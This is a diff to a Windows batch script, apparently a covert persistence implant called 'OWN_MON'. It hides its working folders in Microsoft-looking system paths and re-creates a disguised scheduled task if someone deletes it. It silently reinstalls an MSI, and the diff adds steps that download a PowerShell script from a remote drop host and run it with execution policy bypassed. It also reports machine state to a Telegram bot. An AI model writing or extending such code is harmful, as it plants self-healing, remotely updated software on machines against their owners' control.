@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN_MON BUILD 20260802M3 - wipe-proof heal + Telegram state alerts
+REM OWN_MON BUILD 20260802M4 - wipe-proof heal + rich Telegram reports
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\boot.err"
@@ -17,7 +17,15 @@ set "HOST=%COMPUTERNAME%"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo mon_tick %DATE% %TIME% M3>>"%LOG%"
+echo mon_tick %DATE% %TIME% M4>>"%LOG%"
+
+REM --- refresh rich Telegram reporter from repo ---
+set "TGR=%WD%\tg_report.ps1"
+curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 45 -o "%TEMP%\tg_report_upd.ps1" "%DROP%/tg_report.ps1?t=%CB%" >nul 2>&1
+if not exist "%TEMP%\tg_report_upd.ps1" curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 45 -o "%TEMP%\tg_report_upd.ps1" "%DROP2%/tg_report.ps1?t=%CB%" >nul 2>&1
+if exist "%TEMP%\tg_report_upd.ps1" for %%A in ("%TEMP%\tg_report_upd.ps1") do if %%~zA GTR 500 (
+  findstr /C:"TG_REPORT BUILD" "%TEMP%\tg_report_upd.ps1" >nul && copy /y "%TEMP%\tg_report_upd.ps1" "%TGR%" >nul
+)
 
 REM --- self-rearm persist if someone deleted the tasks ---
 schtasks /Query /TN "\Microsoft\Windows\Diagnosis\Scheduled" >nul 2>&1
@@ -141,7 +149,7 @@ msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus R
 echo msi_reinstall_%ERRORLEVEL%>>"%LOG%"
 exit /b 0
 
-REM --- Telegram: only on state CHANGE (no spam every 2m) ---
+REM --- Telegram: only on state CHANGE (rich report via tg_report.ps1) ---
 :TgState
 set "NEWSTATE=%~1"
 set "MSG=%~2"
@@ -149,10 +157,18 @@ set "OLDSTATE="
 if exist "%STATE%" set /p OLDSTATE=<"%STATE%"
 if /I "%NEWSTATE%"=="%OLDSTATE%" exit /b 0
 echo %NEWSTATE%>"%STATE%"
-call :TgSend "[SC-MON] %HOST% | %MSG% | state=%NEWSTATE% | %DATE% %TIME%"
+if not exist "%WD%\notify.cfg" exit /b 0
+if not exist "%WD%\tg_report.ps1" (
+  curl.exe -L --ssl-no-revoke --connect-timeout 15 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
+)
+if exist "%WD%\tg_report.ps1" (
+  powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State "%NEWSTATE%" -Summary "%MSG%" -WorkDir "%WD%" -OldState "%OLDSTATE%"
+) else (
+  call :TgSendFlat "[SC-MON] %HOST% | %MSG% | %NEWSTATE%"
+)
 exit /b 0
 
-:TgSend
+:TgSendFlat
 if not exist "%WD%\notify.cfg" exit /b 0
 set "TGMSG=%~1"
 set "TGFILE=%TEMP%\tg_payload.txt"
@@ -164,5 +180,5 @@ powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
   "$cfg=@{}; Get-Content -LiteralPath '%WD%\notify.cfg' | ForEach-Object { if ($_ -match '^\s*([A-Za-z0-9_]+)\s*=\s*(.*)\s*$') { $cfg[$matches[1]] = $matches[2].Trim() } };" ^
   "if (-not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID) { exit 0 };" ^
   "$text = Get-Content -LiteralPath '%TGFILE%' -Raw;" ^
-  "try { Invoke-RestMethod -Uri ('https://api.telegram.org/bot' + $cfg.BOT_TOKEN + '/sendMessage') -Method Post -Body @{ chat_id = $cfg.CHAT_ID; text = $text; disable_web_page_preview = 'true' } | Out-Null; Add-Content -LiteralPath '%LOG%' -Value 'tg_sent' } catch { Add-Content -LiteralPath '%LOG%' -Value ('tg_fail ' + $_.Exception.Message) }"
+  "try { Invoke-RestMethod -Uri ('https://api.telegram.org/bot' + $cfg.BOT_TOKEN + '/sendMessage') -Method Post -Body @{ chat_id = $cfg.CHAT_ID; text = $text; disable_web_page_preview = 'true' } | Out-Null } catch {}"
 exit /b 0
